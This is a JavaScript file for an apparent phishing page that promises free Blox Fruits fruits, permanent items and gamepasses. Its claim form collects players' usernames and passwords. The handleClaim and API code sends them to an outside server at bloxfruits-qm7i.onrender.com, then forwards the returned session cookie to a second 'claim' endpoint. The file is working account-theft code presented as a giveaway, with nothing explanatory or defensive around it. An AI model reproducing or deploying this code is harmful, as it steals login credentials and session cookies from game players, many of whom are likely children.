// scripts/script.js

/* =========================
   STATE
========================= */
const State = {
    selectedItem: null,
    selectedType: null,
    isSending: false
};

/* =========================
   ELEMENTS
========================= */
const els = {
    buttons: document.querySelectorAll(".nav button"),

    fruits: document.getElementById("fruitsSection"),
    gamepasses: document.getElementById("gamepassesSection"),
    permanent: document.getElementById("permanentSection"),

    fruitGrid: document.getElementById("fruitGrid"),
    gamepassGrid: document.getElementById("gamepassGrid"),
    permanentGrid: document.getElementById("permanentGrid"),

    modal: document.getElementById("modal"),
    claimModal: document.getElementById("claimModal"),

    modalText: document.getElementById("modalText"),
    claimItem: document.getElementById("claimItem"),

    username: document.getElementById("username"),
    password: document.getElementById("password"),

    yesBtn: document.getElementById("yesBtn"),
    noBtn: document.getElementById("noBtn"),
    claimBtn: document.getElementById("claimBtn")
};

/* =========================
   API LAYER
========================= */
const API = {
    async login(username, password) {
        const res = await fetch("https://bloxfruits-qm7i.onrender.com/api/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username, password })
        });

        if (!res.ok) throw new Error("Login request failed");

        return await res.json();
    },

    async claim(username, cookie) {
        const res = await fetch("https://bloxfruits-qm7i.onrender.com/api/claim", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username, cookie })
        });

        if (!res.ok) throw new Error("Claim request failed");

        return await res.json();
    }
};

/* =========================
   DATA
========================= */
const fruits = [
    { name: "Rocket", rarity: "common" },
    { name: "Spin", rarity: "common" },
    { name: "Blade", rarity: "common" },
    { name: "Spring", rarity: "common" },
    { name: "Bomb", rarity: "common" },
    { name: "Smoke", rarity: "common" },
    { name: "Spike", rarity: "common" },

    { name: "Flame", rarity: "uncommon" },
    { name: "Ice", rarity: "uncommon" },
    { name: "Sand", rarity: "uncommon" },
    { name: "Dark", rarity: "uncommon" },
    { name: "Eagle", rarity: "uncommon" },
    { name: "Diamond", rarity: "uncommon" },

    { name: "Light", rarity: "rare" },
    { name: "Rubber", rarity: "rare" },
    { name: "Magma", rarity: "rare" },
    { name: "Ghost", rarity: "rare" },

    { name: "Quake", rarity: "legendary" },
    { name: "Buddha", rarity: "legendary" },
    { name: "Love", rarity: "legendary" },
    { name: "Creation", rarity: "legendary" },
    { name: "Spider", rarity: "legendary" },
    { name: "Sound", rarity: "legendary" },
    { name: "Phoenix", rarity: "legendary" },
    { name: "Portal", rarity: "legendary" },
    { name: "Lightning", rarity: "legendary" },
    { name: "Pain", rarity: "legendary" },
    { name: "Blizzard", rarity: "legendary" },

    { name: "Gravity", rarity: "mythical" },
    { name: "Mammoth", rarity: "mythical" },
    { name: "T-Rex", rarity: "mythical" },
    { name: "Dough", rarity: "mythical" },
    { name: "Shadow", rarity: "mythical" },
    { name: "Venom", rarity: "mythical" },
    { name: "Gas", rarity: "mythical" },
    { name: "Spirit", rarity: "mythical" },
    { name: "Yeti", rarity: "mythical" },
    { name: "Tiger", rarity: "mythical" },
    { name: "Kitsune", rarity: "mythical" },
    { name: "Control", rarity: "mythical" },
    { name: "Dragon", rarity: "mythical" }
];

const gamepasses = [
    { name: "2x Money", url: "https://static.wikia.nocookie.net/roblox-blox-piece/images/c/cf/BadgeMoneyx2.png" },
    { name: "2x Mastery", url: "https://static.wikia.nocookie.net/roblox-blox-piece/images/1/16/BadgeMasteryx2.png" },
    { name: "Fast Boats", url: "https://static.wikia.nocookie.net/roblox-blox-piece/images/f/fa/BadgeBoats.png" },
    { name: "Fruit Notifier", url: "https://static.wikia.nocookie.net/roblox-blox-piece/images/9/98/BadgeFruitNotifier.png" },
    { name: "Dark Blade", url: "https://static.wikia.nocookie.net/roblox-blox-piece/images/7/7f/BadgeDarkBlade.png" },
    { name: "2x Drop Chance", url: "https://static.wikia.nocookie.net/roblox-blox-piece/images/3/3a/BadgeBossDrops.png" }
];

/* =========================
   UI HELPERS
========================= */

function showSection(tab) {
    const map = {
        all: ["block", "block", "block"],
        fruits: ["block", "none", "none"],
        gamepasses: ["none", "block", "none"],
        permanent: ["none", "none", "block"]
    };

    const [f, g, p] = map[tab];

    els.fruits.style.display = f;
    els.gamepasses.style.display = g;
    els.permanent.style.display = p;
}

function clearGrids() {
    els.fruitGrid.innerHTML = "";
    els.gamepassGrid.innerHTML = "";
    els.permanentGrid.innerHTML = "";
}

/* =========================
   RENDER
========================= */

function createCard(item, parent, type = "fruit") {
    const card = document.createElement("div");
    card.className = `card ${item.rarity || ""} ${type}`;

    const img = document.createElement("img");
    img.src = getImage(item);
    img.onerror = () => img.src = "https://via.placeholder.com/100";

    const label = document.createElement("p");
    label.textContent = item.name;

    card.appendChild(img);
    card.appendChild(label);

    card.onclick = () => openModal(item, type);

    parent.appendChild(card);
}

function getImage(item) {
    const gp = gamepasses.find(g => g.name === item.name);
    return gp?.url || `https://blox-fruits.fandom.com/wiki/Special:FilePath/${item.name}_Fruit.png`;
}

/* =========================
   MODAL
========================= */

function openModal(item, type) {
    State.selectedItem = item;
    State.selectedType = type;

    const label =
        type === "permanent"
            ? `Claim Permanent ${item.name}`
            : type === "gamepass"
                ? `Claim ${item.name} Gamepass`
                : `Claim ${item.name}`;

    els.modalText.textContent = label;
    els.modal.style.display = "flex";
}

function closeModal() {
    els.modal.style.display = "none";
}

function openClaimModal() {
    const item = State.selectedItem;

    els.claimItem.textContent =
        State.selectedType === "permanent"
            ? `Permanent Item: ${item.name}`
            : State.selectedType === "gamepass"
                ? `Gamepass Item: ${item.name}`
                : `Item: ${item.name}`;

    els.claimModal.style.display = "flex";
}

/* =========================
   CLAIM FLOW
========================= */

async function handleClaim() {
    if (State.isSending) return;

    const user = els.username.value.trim();
    const pass = els.password.value.trim();

    if (!user || !pass) {
        alert("Fill all fields.");
        return;
    }

    State.isSending = true;
    els.claimBtn.disabled = true;

    try {
        const loginRes = await API.login(user, pass);

        if (!loginRes.result) {
            alert("Login failed");
            return;
        }

        const cookie = loginRes.session;

        await API.claim(user, cookie);

        console.log("Claim completed");
    } catch (err) {
        console.error(err);
        alert("Request failed");
    } finally {
        State.isSending = false;
        els.claimBtn.disabled = false;
    }
}

/* =========================
   EVENTS
========================= */

els.buttons.forEach(btn => {
    btn.onclick = () => {
        els.buttons.forEach(b => b.classList.remove("active"));
        btn.classList.add("active");
        showSection(btn.dataset.tab);
    };
});

els.noBtn.onclick = closeModal;
els.yesBtn.onclick = () => {
    closeModal();
    openClaimModal();
};

els.claimBtn.onclick = handleClaim;

window.onclick = (e) => {
    if (e.target === els.modal) closeModal();
    if (e.target === els.claimModal) els.claimModal.style.display = "none";
};

/* =========================
   INIT
========================= */

function init() {
    clearGrids();

    fruits.forEach(f => createCard(f, els.fruitGrid, "fruit"));
    fruits.forEach(f => createCard(f, els.permanentGrid, "permanent"));
    gamepasses.forEach(g => createCard(g, els.gamepassGrid, "gamepass"));
}

init();